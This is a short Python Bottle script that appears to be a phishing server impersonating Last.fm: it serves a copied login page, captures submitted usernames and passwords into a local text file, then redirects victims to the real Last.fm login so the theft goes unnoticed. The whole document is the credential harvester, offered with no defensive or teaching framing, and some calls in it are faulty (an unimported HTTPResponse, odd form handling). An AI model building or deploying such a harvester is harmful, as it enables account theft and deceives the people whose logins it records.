from bottle import route, run, request, post

@route('/lastfm')
def lastfm():
    f = open("lasfm.htm", "r")
    return f.read()

@route('/login')
def login():
    un = request.forms.post('username')
    pw = request.forms.post('password')
    f = open("pws.txt", "a")
    f.write(un+"\n"+pw+"\n\n")
    f.close()
    raise HTTPResponse("", status=302, header=dict(Location="https://www.last.fm/login"))

run(host='localhost', port=8080, debug=True)
